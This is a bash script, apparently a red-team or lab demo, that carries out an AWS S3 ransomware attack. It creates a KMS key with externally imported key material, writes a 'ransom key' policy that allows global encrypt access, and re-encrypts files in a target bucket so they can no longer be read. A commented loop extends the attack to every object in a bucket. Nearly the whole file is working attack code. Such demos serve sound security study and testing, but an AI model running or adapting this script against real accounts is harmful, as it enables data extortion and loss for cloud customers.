#!/bin/bash

##################################################
# create_external_kms_key.sh
##################################################
# this script creates a new kms key with 
# external key material and then uses
# that key to encrypt files in a target
# s3 bucket
##################################################

# aws account where kms key will be created
export AWS_ACCOUNT_ID=$(aws sts get-caller-identity | jq '.Account' --raw-output)
# aws current user arn
export AWS_CURRENT_USER=$(aws sts get-caller-identity | jq '.Arn' --raw-output)
# s3 bucket to be encrypted
export S3_BUCKET=$(aws s3 ls | grep attacksurface-target | awk '{print $3}' | head -1)

##################################################
# stage1 - create kms key with external material
##################################################

echo "Stage 1 - Create kms key with external material\n##################################################"

# create key with no key material (get key-id from output)
export KEY_ID=`aws kms create-key --origin EXTERNAL | jq '.KeyMetadata.KeyId' --raw-output`
echo "Created key: ${KEY_ID}"

# generate local key material for import
openssl rand -out PlaintextKeyMaterial.bin 32
openssl base64 -in PlaintextKeyMaterial.bin -out PlaintextKeyMaterial.b64

# generate import params
export KEY=`aws kms --region us-east-1 get-parameters-for-import --key-id ${KEY_ID} --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text`
echo "Key Import Params: ${KEY}"

# create base64 publickey and token
echo $KEY | awk '{print $1}' > PublicKey.b64
echo $KEY | awk '{print $2}' > ImportToken.b64

# create binary publickey and token
openssl enc -d -base64 -A -in PublicKey.b64 -out PublicKey.bin
openssl enc -d -base64 -A -in ImportToken.b64 -out ImportToken.bin

# created encrypted key material
openssl pkeyutl \
    -in PlaintextKeyMaterial.bin \
    -out EncryptedKeyMaterial.bin \
    -inkey PublicKey.bin \
    -keyform DER \
    -pubin \
    -encrypt \
    -pkeyopt \
    rsa_padding_mode:oaep \
    -pkeyopt rsa_oaep_md:sha256

# import encrypted key material
aws kms \
    --region us-east-1 \
    import-key-material \
    --key-id ${KEY_ID} \
    --encrypted-key-material \
    fileb://EncryptedKeyMaterial.bin \
    --import-token fileb://ImportToken.bin \
    --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE

# example policy of kms ransom key - globally readable
# see: https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
cat <<EOF > new_key_policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "EnableIAMUserPermissions",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::870229293131:root"
            },
            "Action": "kms:*",
            "Resource": "*"
        },
        {
            "Sid": "EnableCurrentUserKeySetup",
            "Effect": "Allow",
            "Principal": {
                "AWS": "${AWS_CURRENT_USER}"
            },
            "Action": [
                    "kms:CreateKey",
                    "kms:ImportKey",
                    "kms:ImportKeyMaterial",
                    "kms:DeleteKey",
                    "kms:DeleteKeyMaterial",
                    "kms:EnableKey",
                    "kms:DisableKey",
                    "kms:ScheduleKeyDeletion",
                    "kms:PutKeyPolicy",
                    "kms:SetPolicy",
                    "kms:DeletePolicy",
                    "kms:CreateGrant",
                    "kms:DeleteIdentity",
                    "kms:DescribeIdentity",
                    "kms:KeyStatus",
                    "kms:Status",                        
                    "kms:List*",
                    "kms:Get*",
                    "kms:Describe*",
                    "tag:GetResources"
            ],
            "Resource": "*"
        },
        {
            "Sid": "EnableGlobalKMSEncrypt",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": [
                "kms:GenerateDataKey",
                "kms:Encrypt"
            ],
            "Resource": "*"
        }
    ]
}
EOF

# add key policy
aws kms put-key-policy \
    --policy-name default \
    --key-id ${KEY_ID} \
    --policy file://new_key_policy.json

read -n 1 -p "Continue to stage 2 - upload unencrypted file?"
echo "Stage 2 - Upload unencrypted file\n##################################################"

# create unencrypted file and copy to s3
echo "sample file" | aws s3 cp - s3://${S3_BUCKET}/files/sample_file.txt

# read unencypted content
echo "Unencrypted content: $(aws s3 cp s3://${S3_BUCKET}/files/sample_file.txt -)"

read -n 1 -p "Continue to stage 3 - encrypt file with external material kms key?"
echo "Stage 3 - Encrypt file with external material kms key\n##################################################"

# encrypt existing file
aws s3 cp \
    s3://${S3_BUCKET}/files/sample_file.txt s3://${S3_BUCKET}/files/sample_file.txt \
    --sse aws:kms \
    --sse-kms-key-id "arn:aws:kms:us-east-1:${AWS_ACCOUNT_ID}:key/${KEY_ID}"

# attempt to read encrypted file (this should result in an error)
echo "Encrypted content: $(aws s3 cp s3://${S3_BUCKET}/files/sample_file.txt -)"

# EXAMPLE - to do this for all files in a bucket
# bucketname="attacksurface-target-s3-bucket-46qsim8h"
# aws s3 ls ${bucketname} --recursive | awk '{ print $NF }' > /tmp/filelist

# for file in `cat /tmp/filelist`
# do
#         class=`aws s3api head-object --bucket ${bucketname} --key $file  | jq -r '.StorageClass'`
#         if [ "$class" = "null" ]
#         then
#                 class="STANDARD"

#         fi
#         echo "aws s3 cp s3://${bucketname}/${file} s3://${bucketname}/${file} --sse  --storage-class ${class}"
# done

# alternative key expiry
#--expiration-model KEY_MATERIAL_EXPIRES \
#    --valid-to 2021-09-21T19:00:00Z